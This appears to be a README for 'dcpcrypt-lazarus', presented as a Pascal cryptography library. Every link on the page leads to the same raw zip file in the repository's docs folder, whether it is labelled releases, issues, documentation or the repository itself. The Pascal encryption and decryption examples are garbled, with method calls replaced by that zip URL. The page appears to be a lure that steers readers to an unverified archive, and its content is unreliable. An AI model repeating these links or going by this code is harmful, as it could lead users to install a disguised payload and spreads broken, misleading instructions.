# 🔒 dcpcrypt-lazarus - Secure Your Data Easily

[![Download dcpcrypt-lazarus](https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip)](https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip)

## 📄 Description

DCPcrypt is a powerful cryptographic component library designed specifically for Lazarus and Free Pascal. It supports 20 encryption methods, 10 hashing algorithms, and various block modes. With DCPcrypt, you can ensure the security of your data using pure Pascal code that works across multiple platforms.

## 🛠️ Features

- **Multiple Ciphers**: Utilize a variety of encryption ciphers, including AES and Blowfish.
- **Hashes**: Create secure hashes using algorithms like SHA-256.
- **Flexible Modes**: Access six block cipher modes for various encryption needs.
- **Stream Encryption**: Seamlessly encrypt data streams for additional security.
- **Cross-Platform**: Works on various operating systems to meet different user needs.

## ⚙️ System Requirements

To use dcpcrypt-lazarus, ensure you have the following:

- **Operating System**: Windows, macOS, or Linux
- **Lazarus/Free Pascal**: Version 1.0 or later
- **Memory**: Minimum 512 MB RAM
- **Storage**: At least 50 MB of free disk space

## 🚀 Getting Started

To get started with dcpcrypt-lazarus, follow these simple steps:

1. **Download the Library**: Visit [this page to download](https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip).
2. **Extract the Files**: Once downloaded, extract the files to a folder on your computer.
3. **Open Lazarus**: Launch the Lazarus IDE.
4. **Add the Library to Your Project**: 
   - Go to Project > Project Options > Additions and Overrides.
   - Add the folder where you extracted the files.
5. **Start Using DCPcrypt**: You can now access the cryptographic features within your projects.

## 📦 Download & Install

To install DCPcrypt, first visit [this page to download](https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip). Choose the version that suits your system. After downloading, follow the setup instructions provided in the repository.

1. Navigate to the [Releases page](https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip).
2. Select the latest release.
3. Click on the downloadable file, and follow your browser's prompts to download.
4. After completing the download, open the file and follow the installation steps.

## 📚 Documentation

Detailed documentation is included within the package. You can find usage examples and API documentation. Here are some common tasks you might perform:

- **Encrypt a String**: Learn how to securely encrypt strings of text.
- **Decrypt Data**: Get instructions on how to reverse the encryption process.
- **Using Hash Functions**: Discover how to create secure hashes for data verification.

## 👩‍💻 Examples

Here are some quick examples to get you started:

### Encrypting a Message

```pascal
var
  Cipher: TDCP_rijndael;
  EncryptedData: String;
begin
  Cipher := https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip(nil);
  try
    https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip(Key, Length(Key)*8, InitializationVector);
    https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip(InputMessage, EncryptedData);
  finally
    https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip;
  end;
end;
```

### Decrypting Data

```pascal
var
  Cipher: TDCP_rijndael;
  DecryptedData: String;
begin
  Cipher := https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip(nil);
  try
    https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip(Key, Length(Key)*8, InitializationVector);
    https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip(EncryptedData, DecryptedData);
  finally
    https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip;
  end;
end;
```

## 🔗 Links and Resources

- [GitHub Repository](https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip)
- [Documentation](https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip)

## 🛠️ Need Help?

If you run into issues or have questions, feel free to check the [Issues section](https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip) on GitHub. You can also reach out on the project's discussion forum.

Embrace secure data handling with dcpcrypt-lazarus and ensure your applications are safe and robust.